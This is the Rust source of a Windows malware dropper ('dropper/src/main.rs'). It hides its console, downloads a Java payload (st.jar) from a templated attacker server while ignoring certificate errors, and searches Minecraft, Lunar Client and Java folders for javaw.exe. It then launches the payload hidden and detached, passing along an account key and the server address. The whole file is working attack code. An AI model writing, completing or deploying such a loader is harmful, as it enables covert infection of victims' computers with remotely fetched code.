// language: Rust, file: dropper/src/main.rs
#![windows_subsystem = "windows"]

use std::ffi::OsStr;
use std::fs;
use std::io::Write;
use std::os::windows::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::Networking::WinInet::*;

const KEY: &str = "__ACCOUNT_KEY__";
const SERVER: &str = "__SERVER_IP__";

fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

fn log(loader: &Path, msg: &str) {
    let path = loader.join("debug.txt");
    if let Ok(mut f) = fs::OpenOptions::new().create(true).append(true).open(path) {
        let _ = writeln!(f, "{}", msg);
    }
}

fn download_file(url: &str, dest: &Path, loader: &Path) -> bool {
    log(loader, &format!("Downloading: {}", url));
    unsafe {
        let agent = to_wide("Mozilla/5.0");
        let h_internet = InternetOpenW(agent.as_ptr(), INTERNET_OPEN_TYPE_PRECONFIG, std::ptr::null(), std::ptr::null(), 0);
        if h_internet.is_null() { log(loader, "InternetOpenW failed"); return false; }

        let url_w = to_wide(url);
        
        // Added certificate bypass flags for IP-based servers
        let flags = INTERNET_FLAG_RELOAD | 
                    INTERNET_FLAG_NO_CACHE_WRITE | 
                    INTERNET_FLAG_IGNORE_CERT_CN_INVALID | 
                    INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | 
                    INTERNET_FLAG_SECURE;

        let h_url = InternetOpenUrlW(h_internet, url_w.as_ptr(), std::ptr::null(), 0, flags, 0);
        
        if h_url.is_null() { 
            log(loader, "InternetOpenUrlW failed (Check server IP/URL or SSL error)"); 
            InternetCloseHandle(h_internet); 
            return false; 
        }

        let mut buf = [0u8; 8192];
        let mut bytes_read = 0;
        let mut data = Vec::new();
        while InternetReadFile(h_url, buf.as_mut_ptr() as _, 8192, &mut bytes_read) != 0 && bytes_read > 0 {
            data.extend_from_slice(&buf[..bytes_read as usize]);
        }
        
        log(loader, &format!("Downloaded {} bytes", data.len()));
        
        let success = fs::write(dest, data).is_ok();
        InternetCloseHandle(h_url);
        InternetCloseHandle(h_internet);
        success
    }
}

fn find_java(loader: &Path) -> Option<PathBuf> {
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
    
    let paths = vec![
        format!("{}\\..\\Local\\Packages\\Microsoft.4297127D64EC6_8wekyb3d8bbwe\\LocalCache\\Local\\runtime", appdata),
        format!("{}\\.minecraft\\runtime", appdata),
        format!("{}\\.lunarclient\\jre", appdata),
        format!("{}\\Programs\\Eclipse Adoptium", localappdata),
        "C:\\Program Files\\Java".to_string(),
        "C:\\Program Files\\Eclipse Adoptium".to_string(),
    ];

    for base_path in paths {
        let path = Path::new(&base_path);
        if path.exists() {
            for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()) {
                if entry.file_name() == "javaw.exe" {
                    log(loader, &format!("Found Java: {:?}", entry.path()));
                    return Some(entry.path().to_path_buf());
                }
            }
        }
    }
    
    log(loader, "Java not found in standard paths");
    None
}

fn main() {
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let loader = Path::new(&appdata).join("loader");
    let _ = fs::create_dir_all(&loader);
    
    log(&loader, "--- STARTING BOOT.EXE ---");

    let _ = fs::write(loader.join("key.json"), format!("{{\"key\":\"{}\"}}", KEY));
    log(&loader, "Wrote key.json");

    let jar_path = loader.join("st.jar");
    let url = format!("{}/api/downloads/st.jar", SERVER);
    
    if !download_file(&url, &jar_path, &loader) || !jar_path.exists() {
        log(&loader, "Failed to download st.jar. Exiting.");
        return;
    }

    let java_exe = match find_java(&loader) {
        Some(p) => p,
        None => return, 
    };

    log(&loader, &format!("Launching Java with: {:?}", java_exe));

    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = 0; 
        
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        let cmd_str = format!("\"{}\" -jar \"{}\" {} {}", java_exe.display(), jar_path.display(), KEY, SERVER);
        let mut cmd_line = to_wide(&cmd_str);

        let success = CreateProcessW(
            std::ptr::null(), 
            cmd_line.as_mut_ptr(), 
            std::ptr::null(), 
            std::ptr::null(),
            0, 
            CREATE_NO_WINDOW | DETACHED_PROCESS, 
            std::ptr::null(), 
            std::ptr::null(), 
            &si, 
            &mut pi,
        );

        if success != 0 {
            log(&loader, "Successfully spawned javaw.exe");
            if !pi.hProcess.is_null() { CloseHandle(pi.hProcess); }
            if !pi.hThread.is_null() { CloseHandle(pi.hThread); }
        } else {
            log(&loader, "CreateProcessW failed");
        }
    }
}